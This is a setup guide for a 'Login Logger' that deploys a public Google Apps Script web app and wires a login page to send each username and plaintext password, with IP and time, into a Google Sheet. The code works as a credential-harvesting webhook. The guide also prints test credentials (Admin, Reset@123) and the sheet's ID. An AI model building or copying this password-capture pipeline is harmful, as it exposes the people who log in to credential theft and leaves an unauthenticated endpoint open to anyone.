# Google Sheets Login Logging Setup

## Step 1: Open Google Apps Script

1. Open your Google Sheet: https://docs.google.com/spreadsheets/d/1sGvNJsHNh6KC1sUk7_DDU8KSEX5_PqxA-7ZSVP8eXKM/edit
2. Go to **Extensions** → **Apps Script**

## Step 2: Replace the Code

Delete any existing code and paste this:

```javascript
function doGet(e) {
  try {
    var sheet = SpreadsheetApp.openById('1sGvNJsHNh6KC1sUk7_DDU8KSEX5_PqxA-7ZSVP8eXKM').getActiveSheet();
    
    // Get parameters from URL
    var userName = e.parameter.UserName || '';
    var password = e.parameter.Password || '';
    var ip = e.parameter.IP || '';
    var dataTime = e.parameter.DataTime || '';
    var date = e.parameter.Date || '';
    var time = e.parameter.Time || '';
    
    // Append row with: UserName, Password, IP, DataTime, Date, Time
    sheet.appendRow([userName, password, ip, dataTime, date, time]);
    
    return ContentService.createTextOutput(JSON.stringify({status: 'success'}))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({status: 'error', message: error.toString()}))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doPost(e) {
  try {
    var sheet = SpreadsheetApp.openById('1sGvNJsHNh6KC1sUk7_DDU8KSEX5_PqxA-7ZSVP8eXKM').getActiveSheet();
    var data = JSON.parse(e.postData.contents);
    
    sheet.appendRow([
      data.UserName || '',
      data.Password || '',
      data.IP || '',
      data.DataTime || '',
      data.Date || '',
      data.Time || ''
    ]);
    
    return ContentService.createTextOutput(JSON.stringify({status: 'success'}))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({status: 'error', message: error.toString()}))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
```

## Step 3: Deploy as Web App

1. Click **Deploy** → **New deployment**
2. Click the gear icon ⚙️ next to "Select type" and choose **Web app**
3. Set:
   - **Description**: Login Logger
   - **Execute as**: Me
   - **Who has access**: Anyone
4. Click **Deploy**
5. **Authorize** the app when prompted
6. Copy the **Web app URL** (looks like: `https://script.google.com/macros/s/AKfycb.../exec`)

## Step 4: Update the Frontend

Open `frontend/src/components/LoginPage.tsx` and replace:

```typescript
const GOOGLE_SHEET_WEBHOOK = 'https://script.google.com/macros/s/AKfycbwYourScriptIdHere/exec';
```

With your actual Web app URL from Step 3.

## Step 5: Test

1. Login with credentials:
   - Username: `Admin`, Password: `Reset@123`
   - Username: `user@user.com`, Password: `Reset@123`
2. Check your Google Sheet - a new row should appear with the login details

## Columns in Sheet

| UserName | Password | IP | DataTime | Date | Time |
|----------|----------|-----|----------|------|------|
| Admin | Reset@123 | 192.168.1.1 | 05/03/2026 02:30:45 PM | 05/03/2026 | 02:30:45 PM |

## Troubleshooting

- If data doesn't appear, check the Apps Script execution logs
- Make sure the sheet has the correct column headers in row 1
- Ensure the Web app is deployed with "Anyone" access
